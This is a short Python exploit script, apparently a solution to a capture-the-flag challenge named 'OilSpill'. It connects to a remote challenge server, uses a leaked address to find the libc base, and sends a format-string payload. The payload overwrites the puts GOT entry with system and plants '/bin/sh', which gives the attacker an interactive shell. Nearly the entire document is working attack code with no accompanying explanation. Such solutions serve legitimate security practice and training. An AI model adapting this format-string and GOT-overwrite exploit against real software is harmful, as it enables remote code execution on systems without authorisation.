from pwn import *
#must be run in bin to work

#one_gadget: 0xde78c   puts: 0x809d0

bin = context.binary = ELF('./OilSpill')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#p = process('./OilSpill')
p = remote('oil-spill.sdctf-307600-codelab.kctf.cloud', 1337)
x = int(p.recv(14), 16)
p.recvline()
p.recvline()
p.recvline()
print(hex(x))
calc = (x-0x80970) #+0x4f2a5) #0x10a2fc
print(hex(calc))
calc2 = calc>>32
#calc = calc&0xffffffff
print(hex(calc2))
print(hex(calc))
ret = 0x000000000040025c
#payload = fmtstr_payload(8,{bin.got['puts']:0x00000000004007dd,bin.got['fflush']:(calc+0x4f2a5)}, write_size='byte')
payload = fmtstr_payload(8,{0x0600c80:p64(0x0068732f6e69622f), bin.got['puts']:(calc+libc.sym['system'])},write_size='byte')
print(len(payload))
print(hex(calc))
#gdb.attach(p)

p.sendline(payload)
p.interactive()
